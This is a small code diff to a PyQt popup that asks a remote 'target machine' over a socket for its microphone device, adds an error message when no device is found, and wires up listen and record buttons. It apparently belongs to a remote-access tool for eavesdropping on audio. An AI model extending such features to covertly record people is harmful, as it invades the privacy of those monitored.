@@ -28,7 +28,13 @@ class mainPopup(QWidget, Ui_Form):
 
         self.stopButton.setDisabled(True)
 
-        self.defaultInputDeviceNameLabel.setText(get(self.sock, 'getDefaultInputDeviceName', 'getname'))
+        default_audio_device = get(self.sock, 'getDefaultInputDeviceName', 'getname')
+        if default_audio_device == 'NoDevice':
+            msg = QMessageBox(QMessageBox.Information, 'Error', 'No Recording Device Detected On Target Machine')
+            msg.exec_()
+            self.setDisabled(True)
+
+        self.defaultInputDeviceNameLabel.setText(default_audio_device)
 
         self.listenButton.clicked.connect(self.start_listen)
         self.recordButton.clicked.connect(self.start_record)
